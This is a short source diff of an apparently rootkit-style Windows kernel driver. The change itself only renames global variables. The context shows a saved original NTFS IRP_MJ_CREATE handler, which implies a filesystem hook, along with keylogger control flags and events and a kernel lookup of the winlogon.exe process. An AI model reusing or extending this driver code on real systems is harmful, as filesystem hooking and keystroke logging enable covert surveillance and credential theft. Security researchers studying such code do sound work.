@@ -49,7 +49,7 @@ namespace BeGlobals
     ZWSETEVENT pZwSetEvent;
     ZWRESETEVENT pZwResetEvent;
 
-    HANDLE WinLogonPid;
+    HANDLE winLogonPid;
     PEPROCESS winLogonProc;
 }
 
@@ -101,8 +101,8 @@ namespace BeGlobals
 
     NTFS_IRP_MJ_CREATE_FUNCTION OriginalNTFS_IRP_MJ_CREATE_function = NULL;
 
-    bool Shutdown = false;
-    bool LogKeys  = false;
+    bool bShutdown = false;
+    bool bLogKeys  = false;
 
     KEVENT hKeyLoggerTerminationEvent;
     KEVENT hMainLoopTerminationEvent;
@@ -198,11 +198,11 @@ namespace BeGlobals
         //
         UNICODE_STRING ProcessName = { 0 };
         RtlInitUnicodeString(&ProcessName, L"winlogon.exe");
-        WinLogonPid = BeGetPidFromProcessName(ProcessName);
+        winLogonPid = BeGetPidFromProcessName(ProcessName);
 
-        LOG_MSG("Found winlogon PID: %lu\n", HandleToUlong(WinLogonPid));
+        LOG_MSG("Found winlogon PID: %lu\n", HandleToUlong(winLogonPid));
 
-        if (PsLookupProcessByProcessId(WinLogonPid, &winLogonProc))
+        if (PsLookupProcessByProcessId(winLogonPid, &winLogonProc))
         {
             return STATUS_NOT_FOUND;
         }
